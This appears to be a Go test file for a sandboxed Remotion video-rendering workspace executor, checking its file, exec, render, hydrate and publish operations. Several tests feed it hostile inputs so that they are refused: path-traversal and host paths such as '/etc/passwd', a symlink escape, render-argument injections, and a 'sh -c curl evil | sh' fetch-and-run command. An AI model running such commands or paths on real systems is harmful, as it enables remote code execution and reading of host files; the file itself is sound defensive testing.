package remotion

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/vecchiotom/reelbolt/sandbox/pkg/agent"
	"github.com/vecchiotom/reelbolt/sandbox/pkg/container"
	"github.com/vecchiotom/reelbolt/sandbox/pkg/protocol"
)

// fakeDriver is the container driver without a container: a directory that
// plays the workspace and a recorded exec. It is the seam the executor is built
// on, so an entire op surface is exercised without a runtime.
type fakeDriver struct {
	mu      sync.Mutex
	root    string
	created []string
	deleted []string
	execs   []container.ExecRequest
	exec    func(req container.ExecRequest, dir string) (container.ExecResult, error)
}

func newFakeDriver(t *testing.T) *fakeDriver {
	t.Helper()
	return &fakeDriver{root: t.TempDir()}
}

func (d *fakeDriver) dir(id string) string { return filepath.Join(d.root, id) }

func (d *fakeDriver) Create(id string) (*container.Sandbox, bool, error) {
	dir := d.dir(id)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return nil, false, err
	}
	// The real driver copies the Remotion template in; a package.json is the
	// part of that the executor's status op reports on.
	_ = os.WriteFile(filepath.Join(dir, "package.json"), []byte("{}"), 0o644)
	d.mu.Lock()
	d.created = append(d.created, id)
	d.mu.Unlock()
	return &container.Sandbox{ID: id, ContainerName: "rf-sbx-" + id, WorkspacePath: dir}, true, nil
}

func (d *fakeDriver) GetByExecution(id string) (*container.Sandbox, error) {
	dir := d.dir(id)
	if _, err := os.Stat(dir); err != nil {
		return nil, container.ErrNotFound
	}
	return &container.Sandbox{ID: id, ContainerName: "rf-sbx-" + id, WorkspacePath: dir}, nil
}

func (d *fakeDriver) DeleteByExecution(id string) error {
	d.mu.Lock()
	d.deleted = append(d.deleted, id)
	d.mu.Unlock()
	return os.RemoveAll(d.dir(id))
}

func (d *fakeDriver) StopByExecution(id string) error { return nil }

func (d *fakeDriver) Touch(id string) {}

func (d *fakeDriver) Config() container.Config { return container.Config{} }

func (d *fakeDriver) RunExecResult(id string, req container.ExecRequest) (container.ExecResult, error) {
	if err := container.ValidateExec(req); err != nil {
		return container.ExecResult{}, err
	}
	// The real driver sanitises the request before running it, so the fake does
	// too: an assertion about the argv the CLI sees must see what it will see.
	container.SanitizeExecRequest(&req)
	d.mu.Lock()
	d.execs = append(d.execs, req)
	d.mu.Unlock()
	if d.exec != nil {
		return d.exec(req, d.dir(id))
	}
	return container.ExecResult{Stdout: []byte("ok"), ExitCode: 0, Duration: 3 * time.Millisecond}, nil
}

func (d *fakeDriver) lastExec() container.ExecRequest {
	d.mu.Lock()
	defer d.mu.Unlock()
	if len(d.execs) == 0 {
		return container.ExecRequest{}
	}
	return d.execs[len(d.execs)-1]
}

func (d *fakeDriver) wasDeleted() bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	return len(d.deleted) > 0
}

// ---------------------------------------------------------------------------

func newJob(t *testing.T) *agent.Job {
	t.Helper()
	return &agent.Job{
		JobID:      "7d1c2e0a-5b7e-4a43-9d57-3f0c1a9b2e11",
		SessionID:  "0b6f3c58-91d2-4c7a-8e34-5a2d7f1e9c40",
		JobType:    protocol.JobRemotionWorkspace,
		OrgID:      "5e2b1c90-7a3d-4f68-8b21-0c9d4e6f1a22",
		Attempt:    1,
		LeaseEpoch: 1,
		JobToken:   "TEST.job.token",
		Timeout:    time.Hour,
		Limits:     protocol.AssignLimits{MaxOutputBytes: 1 << 20, IdleTimeoutSec: 1800},
		Spec:       json.RawMessage([]byte("{\"executionId\":\"e\",\"template\":{\"name\":\"n\",\"version\":\"1\"}}")),
		ScratchDir: t.TempDir(),
	}
}

func newSession(t *testing.T, opts ...func(*Config)) (*session, *fakeDriver) {
	t.Helper()
	driver := newFakeDriver(t)
	cfg := Config{Driver: driver, QuotaBytes: 1 << 20}
	for _, o := range opts {
		o(&cfg)
	}
	exec, err := New(cfg)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	s, err := exec.New(context.Background(), newJob(t))
	if err != nil {
		t.Fatalf("New session: %v", err)
	}
	impl, ok := s.(*session)
	if !ok {
		t.Fatalf("session type = %T", s)
	}
	t.Cleanup(func() { s.Close(context.Background()) })
	return impl, driver
}

func call(t *testing.T, s *session, op string, args any) (json.RawMessage, *protocol.OpError) {
	t.Helper()
	raw, err := json.Marshal(args)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	result, opErr := s.Handle(context.Background(), op, raw)
	if opErr != nil {
		return nil, opErr
	}
	out, err := json.Marshal(result)
	if err != nil {
		t.Fatalf("the op result does not encode: %v", err)
	}
	return out, nil
}

// A whole workspace session: write, read, list, delete and report status.
func TestWorkspaceFileOps(t *testing.T) {
	s, _ := newSession(t)

	written, opErr := call(t, s, protocol.OpWriteFile, map[string]any{
		"path": "src/Root.tsx", "content": "export const x = 1;", "encoding": "utf8",
	})
	if opErr != nil {
		t.Fatalf("writeFile: %+v", opErr)
	}
	var wr struct {
		Bytes  int64  `json:"bytes"`
		SHA256 string `json:"sha256"`
	}
	if err := json.Unmarshal(written, &wr); err != nil {
		t.Fatalf("writeFile result: %v", err)
	}
	want := sha256.Sum256([]byte("export const x = 1;"))
	if wr.Bytes != int64(len("export const x = 1;")) || wr.SHA256 != hex.EncodeToString(want[:]) {
		t.Fatalf("writeFile = %+v", wr)
	}

	read, opErr := call(t, s, protocol.OpReadFile, map[string]any{"path": "src/Root.tsx", "maxBytes": 1024})
	if opErr != nil {
		t.Fatalf("readFile: %+v", opErr)
	}
	var rr struct {
		Content  string `json:"content"`
		Encoding string `json:"encoding"`
		Bytes    int64  `json:"bytes"`
	}
	if err := json.Unmarshal(read, &rr); err != nil {
		t.Fatalf("readFile result: %v", err)
	}
	if rr.Content != "export const x = 1;" || rr.Encoding != "utf8" || rr.Bytes != int64(len("export const x = 1;")) {
		t.Fatalf("readFile = %+v", rr)
	}

	listed, opErr := call(t, s, protocol.OpListFiles, map[string]any{"depth": 3})
	if opErr != nil {
		t.Fatalf("listFiles: %+v", opErr)
	}
	if !strings.Contains(string(listed), "src/Root.tsx") {
		t.Fatalf("listFiles = %s", listed)
	}

	deleted, opErr := call(t, s, protocol.OpDeletePath, map[string]any{"path": "src"})
	if opErr != nil {
		t.Fatalf("deletePath: %+v", opErr)
	}
	if !strings.Contains(string(deleted), "true") {
		t.Fatalf("deletePath = %s", deleted)
	}

	status, opErr := call(t, s, protocol.OpStatus, map[string]any{})
	if opErr != nil {
		t.Fatalf("status: %+v", opErr)
	}
	if !strings.Contains(string(status), "\"workspaceReady\":true") {
		t.Fatalf("status = %s", status)
	}
}

// Base64 content is decoded, so a caller can write a binary asset through the
// same op as a source file.
func TestWriteFileAcceptsBase64(t *testing.T) {
	s, _ := newSession(t)
	if _, opErr := call(t, s, protocol.OpWriteFile, map[string]any{
		"path": "assets/logo.bin", "content": "AAEC", "encoding": "base64",
	}); opErr != nil {
		t.Fatalf("writeFile: %+v", opErr)
	}
	data, err := os.ReadFile(filepath.Join(s.fs.Dir(), "assets", "logo.bin"))
	if err != nil {
		t.Fatalf("read back: %v", err)
	}
	if string(data) != string([]byte{0, 1, 2}) {
		t.Fatalf("decoded content = %v", data)
	}
	if _, opErr := call(t, s, protocol.OpWriteFile, map[string]any{
		"path": "a.txt", "content": "%%%", "encoding": "base64",
	}); opErr == nil {
		t.Fatal("invalid base64 was accepted")
	}
	if _, opErr := call(t, s, protocol.OpWriteFile, map[string]any{
		"path": "a.txt", "content": "x", "encoding": "rot13",
	}); opErr == nil {
		t.Fatal("an unknown encoding was accepted")
	}
}

// Every op path is the worker's own business: the engine having built it is not
// a reason to trust it.
func TestWorkspaceOpsRefuseHostPaths(t *testing.T) {
	s, _ := newSession(t)
	cases := []struct {
		op   string
		args map[string]any
	}{
		{protocol.OpWriteFile, map[string]any{"path": "/etc/cron.d/x", "content": "x", "encoding": "utf8"}},
		{protocol.OpWriteFile, map[string]any{"path": "../../etc/passwd", "content": "x", "encoding": "utf8"}},
		{protocol.OpReadFile, map[string]any{"path": "/etc/passwd"}},
		{protocol.OpReadFile, map[string]any{"path": "../secret"}},
		{protocol.OpDeletePath, map[string]any{"path": "/"}},
		{protocol.OpDeletePath, map[string]any{"path": ".."}},
		{protocol.OpListFiles, map[string]any{"path": "../../"}},
		{protocol.OpReadFile, map[string]any{"path": "C:\\Windows\\win.ini"}},
	}
	for _, tc := range cases {
		_, opErr := call(t, s, tc.op, tc.args)
		if opErr == nil {
			t.Errorf("%s accepted %v", tc.op, tc.args)
			continue
		}
		if opErr.Code != protocol.ErrCodeInvalidPath {
			t.Errorf("%s on %v returned %q, want invalid_path", tc.op, tc.args, opErr.Code)
		}
	}
}

// A symlink planted in the workspace must not become a way out of it.
func TestWorkspaceConfinesThroughSymlinks(t *testing.T) {
	s, _ := newSession(t)
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "secret.txt"), []byte("host secret"), 0o600); err != nil {
		t.Fatalf("seed: %v", err)
	}
	if err := os.Symlink(outside, filepath.Join(s.fs.Dir(), "escape")); err != nil {
		t.Skipf("symlinks are not available here: %v", err)
	}
	if _, opErr := call(t, s, protocol.OpReadFile, map[string]any{"path": "escape/secret.txt"}); opErr == nil {
		t.Fatal("readFile followed a symlink out of the workspace")
	}
	if _, opErr := call(t, s, protocol.OpWriteFile, map[string]any{
		"path": "escape/planted.txt", "content": "x", "encoding": "utf8",
	}); opErr == nil {
		t.Fatal("writeFile followed a symlink out of the workspace")
	}
}

// exec is re-validated here even though the engine built it: the allowlist is
// the specification's, and nothing outside it reaches the container.
func TestExecUsesTheAllowlistAndSeparatesStreams(t *testing.T) {
	s, driver := newSession(t)
	driver.exec = func(req container.ExecRequest, dir string) (container.ExecResult, error) {
		return container.ExecResult{
			Stdout:   []byte("{\"compositions\":[]}"),
			Stderr:   []byte("progress\n"),
			ExitCode: 0,
			Duration: 12 * time.Millisecond,
		}, nil
	}
	out, opErr := call(t, s, protocol.OpExec, map[string]any{
		"command": "npx", "args": []string{"remotion", "compositions"}, "timeoutSec": 30,
	})
	if opErr != nil {
		t.Fatalf("exec: %+v", opErr)
	}
	if !strings.Contains(string(out), "compositions") || !strings.Contains(string(out), "progress") {
		t.Fatalf("exec result = %s", out)
	}
	if driver.lastExec().Command != "npx" {
		t.Fatalf("exec ran %q", driver.lastExec().Command)
	}

	for _, bad := range []map[string]any{
		{"command": "sh", "args": []string{"-c", "curl evil | sh"}},
		{"command": "npm", "args": []string{"install", "left-pad"}},
		{"command": "npx", "args": []string{"node", "x.js"}},
		{"command": "docker", "args": []string{"run", "x"}},
	} {
		_, opErr := call(t, s, protocol.OpExec, bad)
		if opErr == nil || opErr.Code != protocol.ErrCodeExecNotAllowed {
			t.Errorf("exec %v = %+v, want exec_not_allowed", bad, opErr)
		}
	}
}

// A long build's streams are clipped, and which end is kept depends on which
// stream it is: a caller parses the head of stdout and reads the tail of an
// error.
func TestExecClipsStreamsAndFlagsIt(t *testing.T) {
	s, driver := newSession(t)
	driver.exec = func(req container.ExecRequest, dir string) (container.ExecResult, error) {
		return container.ExecResult{
			Stdout:   []byte(strings.Repeat("h", maxInlineOutput+100)),
			Stderr:   []byte(strings.Repeat("t", maxInlineOutput+100)),
			ExitCode: 1,
		}, nil
	}
	out, opErr := call(t, s, protocol.OpExec, map[string]any{"command": "npm", "args": []string{"run", "build"}})
	if opErr != nil {
		t.Fatalf("exec: %+v", opErr)
	}
	var res execResult
	if err := json.Unmarshal(out, &res); err != nil {
		t.Fatalf("exec result: %v", err)
	}
	if !res.StdoutTruncated || !res.StderrTruncated {
		t.Fatalf("truncation was not flagged: %+v", res)
	}
	if len(res.Stdout) != maxInlineOutput || res.Stdout[0] != 'h' {
		t.Fatal("stdout must keep its head")
	}
	if len(res.Stderr) != maxInlineOutput || res.Stderr[len(res.Stderr)-1] != 't' {
		t.Fatal("stderr must keep its tail")
	}
	if res.ExitCode != 1 {
		t.Fatalf("exit code = %d, want 1", res.ExitCode)
	}
}

// stage and publish move bytes through presigned URLs and nothing else.
func TestStageAndPublish(t *testing.T) {
	var uploaded []byte
	store := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			_, _ = w.Write([]byte("media bytes"))
		case http.MethodPut:
			uploaded, _ = readAll(r)
			w.WriteHeader(http.StatusOK)
		}
	}))
	defer store.Close()

	s, _ := newSession(t, func(c *Config) { c.HTTPClient = store.Client() })
	staged, opErr := call(t, s, protocol.OpStage, map[string]any{
		"url": store.URL + "/get?X-Amz-Signature=x", "path": "inputs/clip.mp4", "maxBytes": 1024,
	})
	if opErr != nil {
		t.Fatalf("stage: %+v", opErr)
	}
	if !strings.Contains(string(staged), agent.SHA256Bytes([]byte("media bytes"))) {
		t.Fatalf("stage result = %s", staged)
	}

	rendered := filepath.Join(s.fs.Dir(), "out", "final.mp4")
	if err := os.MkdirAll(filepath.Dir(rendered), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(rendered, []byte("rendered"), 0o600); err != nil {
		t.Fatalf("seed: %v", err)
	}
	published, opErr := call(t, s, protocol.OpPublish, map[string]any{
		"path": "out/final.mp4", "putUrl": store.URL + "/put?X-Amz-Signature=x",
		"maxBytes": 1024, "contentType": "video/mp4",
	})
	if opErr != nil {
		t.Fatalf("publish: %+v", opErr)
	}
	if string(uploaded) != "rendered" {
		t.Fatalf("the store received %q", uploaded)
	}
	if !strings.Contains(string(published), agent.SHA256Bytes([]byte("rendered"))) {
		t.Fatalf("publish result = %s", published)
	}
}

// hydrate rebuilds a workspace from the engine's journal, skipping what is
// already there and still matching its digest.
func TestHydrateRestoresAndSkips(t *testing.T) {
	store := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("from the journal"))
	}))
	defer store.Close()

	s, _ := newSession(t, func(c *Config) { c.HTTPClient = store.Client() })
	if _, opErr := call(t, s, protocol.OpWriteFile, map[string]any{
		"path": "src/Root.tsx", "content": "already here", "encoding": "utf8",
	}); opErr != nil {
		t.Fatalf("seed: %+v", opErr)
	}
	if _, opErr := call(t, s, protocol.OpWriteFile, map[string]any{
		"path": "src/Stale.tsx", "content": "stale content", "encoding": "utf8",
	}); opErr != nil {
		t.Fatalf("seed: %+v", opErr)
	}
	out, opErr := call(t, s, protocol.OpHydrate, map[string]any{
		"manifest": []map[string]any{
			{"path": "src/Root.tsx", "sha256": agent.SHA256Bytes([]byte("already here")), "url": store.URL + "/a"},
			{"path": "src/Missing.tsx", "sha256": agent.SHA256Bytes([]byte("from the journal")), "url": store.URL + "/b"},
			{"path": "src/Stale.tsx", "sha256": agent.SHA256Bytes([]byte("from the journal")), "url": store.URL + "/c"},
		},
	})
	if opErr != nil {
		t.Fatalf("hydrate: %+v", opErr)
	}
	got := string(out)
	if !strings.Contains(got, "src/Root.tsx") || !strings.Contains(got, "skipped") {
		t.Fatalf("hydrate did not report the skipped file: %s", got)
	}
	if _, err := os.Stat(filepath.Join(s.fs.Dir(), "src", "Missing.tsx")); err != nil {
		t.Fatalf("the missing file was not restored: %v", err)
	}
	stale, err := os.ReadFile(filepath.Join(s.fs.Dir(), "src", "Stale.tsx"))
	if err != nil {
		t.Fatalf("the stale file disappeared: %v", err)
	}
	if string(stale) != "from the journal" {
		t.Fatalf("a file whose digest did not match was not re-fetched: %q", stale)
	}
	if _, opErr := call(t, s, protocol.OpHydrate, map[string]any{
		"manifest": []map[string]any{{"path": "/etc/passwd", "url": store.URL + "/d"}},
	}); opErr == nil || opErr.Code != protocol.ErrCodeInvalidPath {
		t.Fatalf("hydrating a host path = %+v, want invalid_path", opErr)
	}
}

// render runs the CLI in the container and publishes what it produced.
func TestRenderRunsAndPublishes(t *testing.T) {
	var uploaded []byte
	store := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		uploaded, _ = readAll(r)
		w.WriteHeader(http.StatusOK)
	}))
	defer store.Close()

	s, driver := newSession(t, func(c *Config) { c.HTTPClient = store.Client() })
	driver.exec = func(req container.ExecRequest, dir string) (container.ExecResult, error) {
		// The CLI writes its output into the workspace.
		target := filepath.Join(dir, "out", "final.mp4")
		_ = os.MkdirAll(filepath.Dir(target), 0o755)
		_ = os.WriteFile(target, []byte("the render"), 0o644)
		return container.ExecResult{ExitCode: 0, Duration: 250 * time.Millisecond}, nil
	}
	out, opErr := call(t, s, protocol.OpRender, map[string]any{
		"compositionId": "Main",
		"args":          []string{"--codec=h264", "--crf=18"},
		"putUrl":        store.URL + "/put?X-Amz-Signature=x",
		"outputName":    "out/final.mp4",
	})
	if opErr != nil {
		t.Fatalf("render: %+v", opErr)
	}
	if string(uploaded) != "the render" {
		t.Fatalf("the store received %q", uploaded)
	}
	if !strings.Contains(string(out), "\"bytes\":10") {
		t.Fatalf("render result = %s", out)
	}
	exec := driver.lastExec()
	if exec.Command != "npx" || exec.Args[0] != "remotion" || exec.Args[1] != "render" || exec.Args[2] != "Main" {
		t.Fatalf("render ran %v", exec.Args)
	}
	if !strings.Contains(strings.Join(exec.Args, " "), "--chromium-executable=") {
		t.Fatal("the render did not point the CLI at the bundled headless shell")
	}
}

func TestRenderRefusesHostPathsAndReportsFailures(t *testing.T) {
	s, driver := newSession(t)
	for _, bad := range []map[string]any{
		{"compositionId": "Main", "putUrl": "https://x.invalid/p", "outputName": "/etc/out.mp4"},
		{"compositionId": "../Main", "putUrl": "https://x.invalid/p", "outputName": "out.mp4"},
		{"compositionId": "Main", "putUrl": "https://x.invalid/p", "outputName": "out.mp4", "args": []string{"--output=/etc/leak"}},
		{"compositionId": "Main", "putUrl": "https://x.invalid/p", "outputName": "out.mp4", "args": []string{"--frames=../../x"}},
	} {
		_, opErr := call(t, s, protocol.OpRender, bad)
		if opErr == nil || opErr.Code != protocol.ErrCodeInvalidPath {
			t.Errorf("render %v = %+v, want invalid_path", bad, opErr)
		}
	}

	driver.exec = func(req container.ExecRequest, dir string) (container.ExecResult, error) {
		return container.ExecResult{ExitCode: 1, Stderr: []byte("Module not found: ./src/Missing")}, nil
	}
	_, opErr := call(t, s, protocol.OpRender, map[string]any{
		"compositionId": "Main", "putUrl": "https://x.invalid/p", "outputName": "out.mp4",
	})
	if opErr == nil || opErr.Code != "render_failed" {
		t.Fatalf("a failed render = %+v, want render_failed", opErr)
	}
	if !strings.Contains(opErr.Message, "Module not found") {
		t.Fatalf("the failure did not carry the compiler's message: %s", opErr.Message)
	}
}

// close destroys the workspace, which is what keeps a cancelled job from
// leaving a runner's disk holding a customer's project.
func TestCloseDestroysTheWorkspace(t *testing.T) {
	s, driver := newSession(t)
	if _, opErr := call(t, s, protocol.OpWriteFile, map[string]any{
		"path": "src/Root.tsx", "content": "x", "encoding": "utf8",
	}); opErr != nil {
		t.Fatalf("writeFile: %+v", opErr)
	}
	dir := s.fs.Dir()
	if _, opErr := call(t, s, protocol.OpClose, map[string]any{}); opErr != nil {
		t.Fatalf("close: %+v", opErr)
	}
	if !driver.wasDeleted() {
		t.Fatal("close did not ask the driver to delete the workspace")
	}
	if _, err := os.Stat(dir); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("the workspace still exists: %v", err)
	}
}

// A media op in a workspace session is answered unsupported_op, never executed:
// the two op sets do not overlap.
func TestWorkspaceRefusesMediaOps(t *testing.T) {
	s, _ := newSession(t)
	for _, op := range protocol.MediaOps() {
		if op == protocol.OpStage || op == protocol.OpPublish || op == protocol.OpClose {
			continue // shared with the workspace set by design
		}
		_, opErr := call(t, s, op, map[string]any{})
		if opErr == nil || opErr.Code != protocol.ErrCodeUnsupportedOp {
			t.Errorf("%s in a workspace session = %+v, want unsupported_op", op, opErr)
		}
	}
	if _, opErr := call(t, s, "invented.from.the.future", map[string]any{}); opErr == nil || opErr.Code != protocol.ErrCodeUnsupportedOp {
		t.Fatalf("an unknown op = %+v, want unsupported_op", opErr)
	}
}

// A quota is a session-level fact, and running out of it is disk_full rather
// than a generic failure.
func TestWorkspaceQuotaReportsDiskFull(t *testing.T) {
	s, _ := newSession(t, func(c *Config) { c.QuotaBytes = 8 })
	if _, opErr := call(t, s, protocol.OpWriteFile, map[string]any{
		"path": "big.bin", "content": strings.Repeat("z", 64), "encoding": "utf8",
	}); opErr == nil || opErr.Code != protocol.ErrCodeDiskFull {
		t.Fatalf("a write past the quota = %+v, want disk_full", opErr)
	}
}

// The executor is only built for the job type it implements.
func TestExecutorRefusesAnotherJobType(t *testing.T) {
	driver := newFakeDriver(t)
	exec, err := New(Config{Driver: driver})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	job := newJob(t)
	job.JobType = protocol.JobVideoCompile
	if _, err := exec.New(context.Background(), job); err == nil {
		t.Fatal("the remotion executor accepted a media job")
	}
	var jobErr *agent.JobError
	if _, err := exec.New(context.Background(), job); !errors.As(err, &jobErr) || jobErr.Code != protocol.ErrCodeUnsupportedOp {
		t.Fatalf("error = %v, want an unsupported_op JobError", err)
	}
}

func readAll(r *http.Request) ([]byte, error) {
	defer func() {
		// Best-effort: the body was already fully read above, so a close
		// failure has nothing to do.
		_ = r.Body.Close()
	}()
	buf := new(strings.Builder)
	if _, err := io.Copy(buf, r.Body); err != nil {
		return nil, err
	}
	return []byte(buf.String()), nil
}

// A pool node (AllCores set) raises a render's --concurrency; the one-at-a-time retry stays at 1.
func TestRenderConcurrencyRaisedOnlyInAllCoresMode(t *testing.T) {
	for _, tc := range []struct {
		name  string
		cores int
		args  string
		want  string
	}{
		{"pool node", 8, "--concurrency=2", "--concurrency=8"},
		{"pool node keeps the out-of-memory retry at one", 8, "--concurrency=1", "--concurrency=1"},
		{"ordinary worker", 0, "--concurrency=2", "--concurrency=2"},
	} {
		s, driver := newSession(t, func(c *Config) { c.AllCores = tc.cores })
		if _, opErr := call(t, s, protocol.OpExec, map[string]any{
			"command": "npx", "args": []string{"remotion", "render", tc.args}, "timeoutSec": 30,
		}); opErr != nil {
			t.Fatalf("%s: %+v", tc.name, opErr)
		}
		if got := strings.Join(driver.lastExec().Args, " "); !strings.Contains(got, tc.want) {
			t.Fatalf("%s: %q does not contain %q", tc.name, got, tc.want)
		}
	}
}

func TestReadFileNeverExceedsOneFrame(t *testing.T) {
	s, _ := newSession(t, func(c *Config) { c.QuotaBytes = 64 << 20 })
	put := func(path string, data []byte) {
		t.Helper()
		if _, err := s.fs.WriteFile(path, data); err != nil {
			t.Fatalf("seed %s: %v", path, err)
		}
	}
	bin := func(n int) []byte {
		b := make([]byte, n)
		for i := range b {
			b[i] = byte(0x80 | i%127)
		}
		return b
	}
	put("big.wav", bin(3860000))
	put("ok.wav", bin(2<<20))
	put("big.txt", []byte(strings.Repeat("a", 3900000)))
	put("quotes.txt", []byte(strings.Repeat(`"`, 3<<20)))

	_, opErr := call(t, s, protocol.OpReadFile, map[string]any{"path": "big.wav"})
	if opErr == nil || opErr.Code != protocol.ErrCodeFileTooLarge {
		t.Fatalf("3.86 MB binary: want file_too_large, got %+v", opErr)
	}
	_, opErr = call(t, s, protocol.OpReadFile, map[string]any{"path": "quotes.txt"})
	if opErr == nil || opErr.Code != protocol.ErrCodeFileTooLarge {
		t.Fatalf("escape-inflated text: want file_too_large, got %+v", opErr)
	}
	for _, name := range []string{"ok.wav", "big.txt"} {
		raw, opErr := call(t, s, protocol.OpReadFile, map[string]any{"path": name})
		if opErr != nil {
			t.Fatalf("%s: %+v", name, opErr)
		}
		if len(raw) > protocol.ReadLimitBytes || len(raw) > protocol.MaxPayloadBytes {
			t.Fatalf("%s: response is %d bytes, over the frame limit", name, len(raw))
		}
	}
}
